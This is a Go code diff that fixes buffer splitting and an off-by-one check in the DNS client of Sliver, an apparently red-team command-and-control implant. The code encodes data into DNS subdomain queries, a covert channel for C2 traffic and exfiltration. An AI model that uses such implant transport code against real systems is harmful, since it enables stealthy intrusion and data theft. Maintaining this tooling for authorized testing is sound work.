@@ -79,7 +79,6 @@ const (
 	// Little endian
 	sessionIDBitMask = 0x00ffffff // Bitwise mask to get the dns session ID
 	metricsMaxSize   = 8
-	shaveMargin      = 20 // Max metadata *should* be 18 bytes, but I added extra margin
 	queueBufSize     = 512
 )
 
@@ -497,12 +496,20 @@ func (s *SliverDNSClient) splitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 	stop := start
 	var encoded string
 	for index := 0; stop < len(data); index++ {
-		msg.Start = uint32(index)
-		stop += (maxLength - shaveMargin) // MaxLength - max length of pb metadata
+		if len(data) < index {
+			panic("boundary miscalculation") // We should always be able to encode more than one byte
+		}
+
+		// {{if .Config.Debug}}
+		log.Printf("[dns] loop #%d, start = %d, stop = %d", index, start, stop)
+		// {{end}}
+		msg.Start = uint32(start)
+		stop += int(maxLength / 2) // MaxLength - max length of pb metadata
 		if len(data) < stop {
 			stop = len(data) - 1 // make sure the loop is executed at least once
 		}
-		for len(encoded) < maxLength-1 && stop < len(data) {
+		encoded = ""
+		for len(encoded) < maxLength && stop < len(data) {
 			stop++
 			// {{if .Config.Debug}}
 			log.Printf("[dns] shave data [%d:%d] of %d", start, stop, len(data))
@@ -523,6 +530,9 @@ func (s *SliverDNSClient) splitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 		}
 		subdata = append(subdata, domain)
 		start = stop
+		// {{if .Config.Debug}}
+		log.Printf("[dns] next start = %d", stop)
+		// {{end}}
 	}
 	// {{if .Config.Debug}}
 	log.Printf("[dns] split subdata: %v", subdata)
@@ -575,7 +585,7 @@ func (s *SliverDNSClient) loadResolvConf() error {
 // Joins subdata to the parent domain, you must have already done the math to
 // ensure the subdata can fit in the domain
 func (s *SliverDNSClient) joinSubdataToParent(subdata string) (string, error) {
-	if s.subdataSpace <= len(subdata) {
+	if s.subdataSpace < len(subdata) {
 		return "", errMsgTooLong // For sure won't fit after we add '.'
 	}
 	subdomains := []string{}
